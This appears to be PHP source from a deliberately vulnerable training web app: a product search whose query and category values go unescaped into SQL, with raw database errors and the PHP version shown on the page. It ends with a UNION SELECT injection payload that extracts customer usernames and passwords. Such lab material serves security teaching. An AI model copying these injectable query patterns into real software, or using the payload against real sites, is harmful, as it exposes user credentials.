<?php include "../../config/database.php";
?>


<!DOCTYPE html>
<html>
<head>
	<title>Search results</title>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<link rel="stylesheet" type="text/css" href="style.css"/>
</head>
<body>
<?php

    
    $query = $_GET['query']; //check if empty
    $category = $_GET['category']; 


    
	// gets value sent over search form
	
    $min_length = 0;

    
	// you can set minimum length of the query if you want
	
	if(strlen($query) >= $min_length){ // if query length is more or equal minimum length then
        
        $version = phpversion();
        print $version;

        if(get_magic_quotes_runtime())
            {
                // Deactivate
                set_magic_quotes_runtime(true);
            }

        $query = htmlspecialchars($query);
        // changes characters used in html to their equivalents, for example: < to &gt;
        
        //$query = mysql_real_escape_string($query);
        // makes sure nobody uses SQL injection
        
        if ($category != "all") {
            $query =  "SELECT name,price FROM GVWA.items 
            WHERE  ((`name` = '$query') OR (`name` LIKE '%".$query."%') OR (`description` LIKE '%".$query."%')) AND `category` = '$category'";
        } else {
            $query = "SELECT name,price FROM GVWA.items
                WHERE (`name` LIKE '%".$query."%') OR (`description` LIKE '%".$query."%');";
        }

        $raw_results = mysqli_query($con,  $query ) or die( '<pre>' . ((is_object($con)) ? mysqli_error($con) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    
        //$category = mysqli_fetch_all($raw_results);

        //if (! empty($category)) {
        //  foreach ($category as $key => $value) {
        //    echo "<p><h3>{$category[$key][0]}</h3></p>";
        //  echo ($category[$key][1]);
        //}
        //}

        //while ($row = mysqli_fetch_row($raw_result)) {
        // Get values
        //$first = $row["name"];
        //$last  = $row["price"];
    
        // Feedback for end user
        //  $html .= "<pre><br />First name: {$first}<br />Surname: {$last}</pre>";
        //}

        //$category = mysqli_fetch_all($category);
        
        // * means that it selects all fields, you can also write: `id`, `title`, `text`
        // articles is the name of our table
        
        // '%$query%' is what we're looking for, % means anything, for example if $query is Hello
        // it will match "hello", "Hello man", "gogohello", if you want exact match use `title`='$query'
        // or if you want to match just full word so "gogohello" is out use '% $query %' ...OR ... '$query %' ... OR ... '% $query'


        $WarningHtml = '';
        if( ini_get( 'magic_quotes_gpc' ) == true ) {
            echo "<div class=\"warning\">The PHP function \"<em>Magic Quotes</em>\" is enabled.</div>";
        }
        // Is PHP function safe_mode enabled?
        if( ini_get( 'safe_mode' ) == true ) {
            echo "<div class=\"warning\">The PHP function \"<em>Safe mode</em>\" is enabled.</div>";
}

        while ($row = mysqli_fetch_assoc($raw_results)) {
            // Get values
            $first = $row["name"];
            $last  = $row["price"];
    
            // Feedback for end user
            echo "<pre><br />name: {$first}<br />price: {$last}</pre>";
        }
    }
	else{ // if query length is less than minimum
		echo "Minimum length is ".$min_length;
    }
?>
</body>
</html>


<?php include "../../config/database.php";

$category = mysqli_query($con,"SELECT * FROM `GVWA`.`categories` ORDER BY `categories`.`name` ASC");
$category = mysqli_fetch_all($category);
?>

<html>
<head>
	<title>Search</title>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
</head>
<body>

<form action="search.php" method="GET">
<div class="search-box">
    <select id="category" name="category" multiple="multiple">
        <option value="all" selected="selected">All Categories</option>
        <?php
            if (! empty($category)) {
                 foreach ($category as $key => $value) { 
                    echo '<option value="' . implode($category[$key]) . '">' . implode($category[$key]) . '</option>';
                 }
             }
        ?>
    </select>
</div>
	<input type="text" name="query" />
	<input type="submit" value="Search" />
</form>

</body>
</html>




<?php include "../../config/database.php";

$category = mysqli_query($con,"SELECT * FROM `GVWA`.`categories` ORDER BY `categories`.`name` ASC");
$category = mysqli_fetch_all($category);

// Is PHP function magic_quotee enabled?
$WarningHtml = '';
if( ini_get( 'magic_quotes_gpc' ) == true ) {
	$WarningHtml .= "<div class=\"warning\">The PHP function \"<em>Magic Quotes</em>\" is enabled.</div>";
}
// Is PHP function safe_mode enabled?
if( ini_get( 'safe_mode' ) == true ) {
	$WarningHtml .= "<div class=\"warning\">The PHP function \"<em>Safe mode</em>\" is enabled.</div>";
}
?>

<html>
<body>
<form action="#" method="GET">
<div class="search-box">
    <select id="category" name="category" multiple="multiple">
        <option value="all" selected="selected">All Categories</option>
        <?php
            if (! empty($category)) {
                 foreach ($category as $key => $value) { 
                    echo '<option value="' . implode($category[$key]) . '">' . implode($category[$key]) . '</option>';
                 }
             }
        ?>
    </select>
</div>
	<input type="text" name="query" />
	<input type="submit" value="Search" name="submit" />
</form>


    <?php include "../../config/database.php";

if( isset( $_GET[ 'submit' ] ) ) {
	// Get input
    $category = $_GET[ 'category' ];
    $query = $_GET[ 'query' ];
    echo $category;
    echo $query;

	// Check database
    if ($category != "all") {
        $raw_query =  "SELECT name,price FROM GVWA.items 
        WHERE  ((`name` = '$query') OR (`name` LIKE '%".$query."%') OR (`description` LIKE '%".$query."%')) AND `category` = '$category'";
    } else {
        $raw_query = "SELECT name,price FROM GVWA.items
            WHERE (`name` LIKE '%".$query."%') OR (`description` LIKE '%".$query."%');";
    }
    $raw_results = mysqli_query($con,  $raw_query ) or die( '<pre>' . ((is_object($con)) ? mysqli_error($con) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	// Get results
	while( $row = mysqli_fetch_assoc( $raw_results ) ) {
		// Get values
		$first = $row["name"];
		$last  = $row["price"];

		// Feedback for end user
		echo "<pre><br />First name: {$first}<br />Surname: {$last}</pre>";
	}

	mysqli_close($con);
}

?>
</body>
</html>

A'UNION SELECT username,password from customers-- 